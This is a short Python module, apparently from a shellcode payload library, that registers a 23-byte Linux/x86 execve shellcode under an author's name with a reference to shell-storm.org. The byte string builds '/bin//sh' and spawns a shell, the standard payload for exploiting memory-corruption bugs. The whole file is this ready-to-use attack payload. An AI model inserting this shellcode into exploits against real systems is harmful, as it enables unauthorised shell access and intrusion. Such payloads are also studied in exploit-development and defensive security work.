from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Hamza Megahed"
    Shellcode.info["name"] = "Linux/x86 - execve shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-827.php"
    ]
    Shellcode.info["size"] = 23
    Shellcode.info["payload"] = [
        r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62" 	
        r"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    ]
